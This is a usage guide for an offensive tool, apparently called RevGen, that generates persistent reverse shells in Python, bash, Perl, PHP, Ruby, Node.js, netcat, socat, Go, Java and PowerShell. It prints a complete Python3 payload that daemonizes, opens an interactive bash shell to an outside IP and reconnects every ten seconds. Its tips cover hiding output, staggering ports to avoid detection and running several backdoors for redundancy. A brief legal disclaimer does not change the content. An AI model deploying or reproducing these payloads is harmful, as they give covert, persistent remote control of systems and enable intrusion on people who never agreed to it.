# 💀 RevGen Persistent Shells Guide

## 🎯 Overview

RevGen now supports **persistent variants** for ALL available shell languages! These persistent shells automatically:

- **Daemonize** and run in the background
- **Survive terminal closure**
- **Auto-reconnect** every 10 seconds if connection is lost
- **Operate independently** of the parent process

## 🧞‍♂️ Available Persistent Shells

### **Python-Based Persistent Shells**
```bash
# Python (Persistent) - True daemon with fork()
revgen --ip 192.168.1.100 --port 4444 --lang python_persistent

# Python3 (Persistent) - True daemon with fork()
revgen --ip 192.168.1.100 --port 4444 --lang python3_persistent
```

### **Shell-Based Persistent Shells**
```bash
# Bash (Persistent) - Uses nohup with infinite loop
revgen --ip 192.168.1.100 --port 4444 --lang bash_persistent

# Shell (Persistent) - POSIX shell with nohup
revgen --ip 192.168.1.100 --port 4444 --lang sh_persistent
```

### **Scripting Language Persistent Shells**
```bash
# Perl (Persistent) - Fork-based daemon
revgen --ip 192.168.1.100 --port 4444 --lang perl_persistent

# PHP (Persistent) - Uses pcntl_fork() for daemonization
revgen --ip 192.168.1.100 --port 4444 --lang php_persistent

# Ruby (Persistent) - Process.daemon for background execution
revgen --ip 192.168.1.100 --port 4444 --lang ruby_persistent

# Node.js (Persistent) - Detached child process
revgen --ip 192.168.1.100 --port 4444 --lang node_persistent
```

### **Network Tool Persistent Shells**
```bash
# Netcat (Persistent) - Infinite loop with nohup
revgen --ip 192.168.1.100 --port 4444 --lang nc_persistent

# Netcat OpenBSD (Persistent) - Named pipe approach
revgen --ip 192.168.1.100 --port 4444 --lang nc_openbsd_persistent

# Socat (Persistent) - Full TTY with persistence
revgen --ip 192.168.1.100 --port 4444 --lang socat_persistent
```

### **Compiled Language Persistent Shells**
```bash
# Go (Persistent) - Infinite loop with temp file
revgen --ip 192.168.1.100 --port 4444 --lang golang_persistent

# Java (Persistent) - Infinite loop with temp compilation
revgen --ip 192.168.1.100 --port 4444 --lang java_persistent
```

### **Windows Persistent Shell**
```bash
# PowerShell (Persistent) - Hidden window with infinite loop
revgen --ip 192.168.1.100 --port 4444 --lang powershell_persistent
```

## 🔥 Example Usage

### **Generate All Persistent Shells**
```bash
# See all available persistent options
revgen --list | grep persistent

# Generate specific persistent shell
revgen --ip 10.0.0.5 --port 9001 --lang python3_persistent --copy

# Generate persistent bash shell
revgen --ip 192.168.1.100 --port 4444 --lang bash_persistent
```

### **Your Original Python3 Persistent Example**
```bash
# This is equivalent to:
revgen --ip 192.168.29.31 --port 4444 --lang python3_persistent
```

Which generates:
```python
python3 -c "import socket,subprocess,os,time,sys;exec('try:\n if os.fork()>0:sys.exit(0)\nexcept:sys.exit(1)\nos.setsid();os.chdir(\'/\');\nwhile True:\n try:\n  s=socket.socket();s.connect((\'192.168.29.31\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])\n except:time.sleep(10)\n finally:\n  try:s.close()\n  except:pass')" &
```

## ⚡ Key Features of Persistent Shells

### **1. True Background Execution**
- All persistent shells run as background processes
- Detached from parent terminal/session
- Immune to terminal closure

### **2. Auto-Reconnection**
- Built-in retry logic (10-second intervals)
- Survives network interruptions
- Continuous connection attempts

### **3. Stealth Operation**
- Output redirected to `/dev/null`
- Silent operation (no console output)
- Minimal process signatures

### **4. Cross-Platform Support**
- Linux/Unix: Fork-based daemons
- Windows: Hidden PowerShell processes
- Universal: Language-agnostic approaches

## 🎯 Termination Commands

### **Quick Kill Commands for All Persistent Shells**
```bash
# Kill Python-based persistent shells
sudo pkill -f "python.*socket.*subprocess"

# Kill bash-based persistent shells  
sudo pkill -f "bash.*while.*tcp"

# Kill any shell connecting to your IP
sudo pkill -f "192.168.29.31.*4444"

# Nuclear option - kill all suspicious processes
sudo pkill -f "(python|bash|perl|php|ruby|node).*socket"
```

## 🚀 Advanced Examples

### **Compare Regular vs Persistent**
```bash
# Regular shell (terminates when terminal closes)
revgen --ip 192.168.1.100 --port 4444 --lang python3

# Persistent shell (survives terminal closure)
revgen --ip 192.168.1.100 --port 4444 --lang python3_persistent
```

### **Multiple Persistent Shells**
```bash
# Deploy multiple language backdoors for redundancy
revgen --ip 192.168.1.100 --port 4444 --lang python3_persistent --copy
revgen --ip 192.168.1.100 --port 4445 --lang bash_persistent --copy  
revgen --ip 192.168.1.100 --port 4446 --lang perl_persistent --copy
```

## ⚠️ Important Notes

1. **Root Privileges**: Some persistent shells may require elevated privileges
2. **Process Detection**: Persistent processes are more detectable by system monitoring
3. **Resource Usage**: Infinite loops consume system resources
4. **Legal Warning**: Only use on authorized systems you own or have permission to test

## 💡 Pro Tips

- **Stagger Connections**: Use different ports to avoid detection
- **Multiple Languages**: Deploy various shells for redundancy
- **Monitor Processes**: Check running processes to verify persistence
- **Clean Termination**: Always properly terminate persistent shells after testing

---

**Generated by RevGen - The Reverse Shell Genie 🧞‍♂️**

*Remember: With great power comes great responsibility. Use ethically!*
